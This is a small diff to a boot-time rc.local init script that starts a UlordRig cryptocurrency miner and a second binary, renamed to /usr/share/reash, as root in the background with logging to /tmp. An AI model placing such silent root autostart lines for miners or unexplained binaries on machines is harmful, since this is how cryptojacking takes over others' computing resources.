@@ -8,7 +8,7 @@
 # Short-Description: Run /etc/rc.local if it exist
 ### END INIT INFO
 sudo  /opt/miners/UlordRig-Linux-V1.0.0/ulordrig >>/tmp/miner.log 2>&1 &
-sudo  /usr/share/*** >>/tmp/run.log 2>&1 &
+sudo  /usr/share/reash >>/tmp/run.log 2>&1 &
 
 PATH=/sbin:/usr/sbin:/bin:/usr/bin
 
